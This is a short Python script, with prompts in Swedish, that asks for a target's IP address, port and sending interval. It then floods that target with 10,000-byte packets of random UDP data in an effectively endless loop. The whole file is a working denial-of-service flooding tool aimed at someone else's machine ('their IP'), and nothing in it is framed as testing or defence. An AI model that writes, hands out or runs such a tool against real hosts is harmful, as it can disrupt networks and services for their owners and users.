import socket, random, time
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("IP? (Deras IP): ")
port = int(input("Port? (Deras Port): "))
sleep = float(input("Godnatt (hur snabbt den ska skicka): "))
 
s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Skickar: {i}", end='\r')
    time.sleep(sleep)
    
 